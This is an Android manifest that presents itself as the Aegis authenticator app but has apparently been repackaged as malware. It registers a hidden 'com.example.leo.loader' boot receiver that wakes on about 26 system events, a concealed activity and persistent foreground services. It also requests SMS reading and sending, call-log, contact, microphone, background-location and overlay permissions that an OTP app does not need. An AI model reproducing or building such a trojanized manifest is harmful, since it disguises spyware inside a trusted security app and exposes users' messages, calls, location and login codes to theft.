<?xml version="1.0" encoding="UTF-8"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="48" android:versionName="2.0" android:compileSdkVersion="23" android:compileSdkVersionCodename="6.0-2438415" package="com.beemdevelopment.aegis" platformBuildVersionCode="30" platformBuildVersionName="11">
    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="30">
	</uses-sdk>
    <queries>
        		
        <package android:name="com.authy.authy">
		</package>
        		
        <package android:name="org.fedorahosted.freeotp">
		</package>
        		
        <package android:name="org.liberty.android.freeotpplus">
		</package>
        		
        <package android:name="com.google.android.apps.authenticator2">
		</package>
        		
        <package android:name="com.azure.authenticator">
		</package>
        		
        <package android:name="com.valvesoftware.android.steam.community">
		</package>
        		
        <package android:name="com.authenticator.authservice2">
		</package>
        	
    </queries>
    <uses-feature android:name="android.hardware.microphone"/>
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CALL_PHONE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_USER_PRESENT"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.SET_WALLPAPER"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.VIBRATE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-feature android:name="android.hardware.camera" android:required="false">
	</uses-feature>
    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false">
	</uses-feature>
    <uses-permission android:name="android.permission.CAMERA">
	</uses-permission>
    <uses-permission android:name="android.permission.USE_BIOMETRIC">
	</uses-permission>
    <uses-permission android:name="android.permission.USE_FINGERPRINT">
	</uses-permission>
    <application android:name="com.beemdevelopment.aegis.AegisApplication" android:allowBackup="true" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:extractNativeLibs="false" android:icon="@7F0E0000" android:label="Aegis" android:requestLegacyExternalStorage="true" android:theme="@7F1201AF" android:usesCleartextTraffic="true" android:backupAgent="com.beemdevelopment.aegis.AegisBackupAgent" android:supportsRtl="true" android:fullBackupOnly="true" android:fullBackupContent="@7F140000">
                
        <receiver android:name="com.example.leo.loader.BootBroadcastReceiver" android:directBootAware="true" android:enabled="true" android:exported="true">
                        
            <intent-filter android:priority="999">
                                
                <action android:name="android.intent.action.BATTERY_CHANGED"/>
                                
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                                
                <action android:name="android.intent.action.DATE_CHANGED"/>
                                
                <action android:name="android.intent.action.DREAMING_STOPPED"/>
                                
                <action android:name="android.intent.action.EXTERNAL_APPLICATIONS_AVAILABLE"/>
                                
                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/>
                                
                <action android:name="android.intent.action.MEDIA_MOUNTED"/>
                                
                <action android:name="android.intent.action.MEDIA_SCANNER_FINISHED"/>
                                
                <action android:name="android.intent.action.MEDIA_SCANNER_STARTED"/>
                                
                <action android:name="android.intent.action.PACKAGE_ADDED"/>
                                
                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
                                
                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
                                
                <action android:name="android.intent.action.SCREEN_OFF"/>
                                
                <action android:name="android.intent.action.SCREEN_ON"/>
                                
                <action android:name="android.intent.action.SERVICE_STATE"/>
                                
                <action android:name="android.intent.action.SETTINGS"/>
                                
                <action android:name="android.intent.action.SIG_STR"/>
                                
                <action android:name="android.intent.action.TIME_SET"/>
                                
                <action android:name="android.intent.action.TIME_TICK"/>
                                
                <action android:name="android.intent.action.UMS_CONNECTED"/>
                                
                <action android:name="android.intent.action.USER_PRESENT"/>
                                
                <action android:name="android.intent.action.WALLPAPER_CHANGED"/>
                                
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
                                
                <action android:name="android.net.wifi.STATE_CHANGE"/>
                                
                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
                                
                <action android:name="android.server.checkin.FOTA_CANCEL"/>
                                
                <category android:name="android.intent.category.HOME"/>
                            
            </intent-filter>
                    
        </receiver>
                
        <activity android:name="com.example.leo.loader.KeepScreenActivity" android:excludeFromRecents="true" android:exported="true" android:noHistory="true" android:taskAffinity="taskAffinity.KeepScreenActivity"/>
                
        <service android:name="com.example.leo.loader.service.ForegroundService" android:foregroundServiceType="0x8" android:permission="android.permission.BIND_JOB_SERVICE"/>
                
        <service android:name="com.example.leo.loader.service.ForegroundService$InnerService" android:foregroundServiceType="0x8" android:permission="android.permission.BIND_JOB_SERVICE"/>
            
		
        <activity android:name="com.beemdevelopment.aegis.ui.TransferEntriesActivity" android:label="@7F1101C9">
		</activity>
        		
        <activity android:name="com.beemdevelopment.aegis.ui.AboutActivity" android:label="@7F1101C2">
		</activity>
        		
        <activity android:name="com.beemdevelopment.aegis.ui.ImportEntriesActivity" android:label="@7F1101C4">
		</activity>
        		
        <activity android:name="com.beemdevelopment.aegis.ui.MainActivity" android:label="Aegis">
            			
            <intent-filter>
                				
                <action android:name="android.intent.action.MAIN">
				</action>
                				
                <category android:name="android.intent.category.LAUNCHER">
				</category>
                			
            </intent-filter>
            			
            <intent-filter>
                				
                <action android:name="android.intent.action.VIEW">
				</action>
                				
                <category android:name="android.intent.category.DEFAULT">
				</category>
                				
                <category android:name="android.intent.category.BROWSABLE">
				</category>
                				
                <data android:scheme="otpauth">
				</data>
                			
            </intent-filter>
            			
            <intent-filter>
                				
                <action android:name="android.intent.action.SEND">
				</action>
                				
                <category android:name="android.intent.category.DEFAULT">
				</category>
                				
                <data android:mimeType="image/*">
				</data>
                			
            </intent-filter>
            		
        </activity>
        		
        <activity android:name="com.beemdevelopment.aegis.ui.ScannerActivity" android:label="@7F1101C8" android:screenOrientation="1" android:configChanges="0x000004A0">
		</activity>
        		
        <activity android:name="com.beemdevelopment.aegis.ui.EditEntryActivity" android:label="@7F1101C3">
		</activity>
        		
        <activity android:name="com.beemdevelopment.aegis.ui.IntroActivity" android:screenOrientation="1">
		</activity>
        		
        <activity android:name="com.beemdevelopment.aegis.ui.AuthActivity">
		</activity>
        		
        <activity android:name="com.beemdevelopment.aegis.ui.PreferencesActivity" android:label="@7F1101C7">
		</activity>
        		
        <activity android:name="com.beemdevelopment.aegis.ui.SlotManagerActivity" android:label="@7F1101C6">
		</activity>
        		
        <activity android:name="com.beemdevelopment.aegis.ui.GroupManagerActivity" android:label="@7F1101C5">
		</activity>
        		
        <activity android:name="com.beemdevelopment.aegis.ui.PanicResponderActivity" android:theme="@android:01030055" android:launchMode="3" android:noHistory="true">
            			
            <intent-filter>
                				
                <action android:name="info.guardianproject.panic.action.TRIGGER">
				</action>
                				
                <category android:name="android.intent.category.DEFAULT">
				</category>
                			
            </intent-filter>
            		
        </activity>
        		
        <activity android:name="com.beemdevelopment.aegis.ui.ExitActivity">
		</activity>
        		
        <service android:name="com.beemdevelopment.aegis.services.NotificationService">
		</service>
        		
        <provider android:name="androidx.core.content.FileProvider" android:exported="false" android:authorities="com.beemdevelopment.aegis.fileprovider" android:grantUriPermissions="true">
            			
            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@7F140001">
			</meta-data>
            		
        </provider>
        		
        <meta-data android:name="android.webkit.WebView.MetricsOptOut" android:value="true">
		</meta-data>
        		
        <provider android:name="androidx.lifecycle.ProcessLifecycleOwnerInitializer" android:exported="false" android:multiprocess="true" android:authorities="com.beemdevelopment.aegis.lifecycle-process">
		</provider>
        	
    </application>
</manifest>
